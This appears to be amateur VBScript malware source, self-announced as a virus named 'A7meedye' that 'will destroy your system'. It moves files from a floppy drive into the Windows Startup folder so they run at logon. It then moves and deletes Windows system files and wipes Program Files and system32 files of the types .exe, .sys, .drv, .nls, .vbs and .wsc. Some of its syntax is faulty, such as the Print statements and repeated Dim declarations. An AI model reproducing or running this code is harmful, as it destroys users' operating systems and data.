   Print "WARNING: This virus will destroy your system"
   Print "ha ha ha ha"
   Print "Name of the virus:A7meedye"
   Print "made by Ahmedo"
   Dim filesys, newfolder, newfolderpath
   newfolderpath = "c:\WINDOWS\Folder"
   Set filesys = CreateObject("Scripting.FileSystemObject")
   If Not filesys.FolderExists(newfolderpath) Then
   Set newfolder = filesys.CreateFolder(newfolderpath)
   End If

   'Moving a file system - the if FileExists does not work'
   Dim filemove
   Set filemove = CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "a:\*.*", "C:\WINDOWS\Start Menu\Programs\StartUp"

   Dim filemove
   Set filemove = CreateObject("Scripting.FileSystemObject")
   filemove.MoveFile "c:\windows\system\*.*", "c:\WINDOWS\Folder\"

   'Deleting a file - you don't have to use FileExists'

   Dim filedel
   Set filedel = CreateObject("Scripting.FileSystemObject")
   filedel.DeleteFile "c:\windows\system\*.*"

   Dim filedel
   Set filedel = CreateObject("Scripting.FileSystemObject")
   filedel.DeleteFile "c:\Program Files\*.*"

   'Deleting a file - you don't have to use FileExists'

   Dim filedelwsc
   Set filedelwsc = CreateObject("Scripting.FileSystemObject")
   filedelwsc.DeleteFile "c:\windows\system32\*.wsc"

   Dim filedeldrv
   Set filedeldrv = CreateObject("Scripting.FileSystemObject")
   filedeldrv.DeleteFile "c:\windows\system32\*.drv"

   Dim filedelvbs
   Set filedelvbs = CreateObject("Scripting.FileSystemObject")
   filedelvbs.DeleteFile "c:\windows\system32\*.vbs"

   Dim filedelsys
   Set filedelsys = CreateObject("Scripting.FileSystemObject")
   filedelsys.DeleteFile "c:\windows\system32\*.sys"

   Dim filedelnls
   Set filedelnls = CreateObject("Scripting.FileSystemObject")
   filedelnls.DeleteFile "c:\windows\system32\*.nls"

   Dim filedelexe
   Set filedelexe = CreateObject("Scripting.FileSystemObject")
   filedelexe.DeleteFile "c:\windows\system32\*.exe"
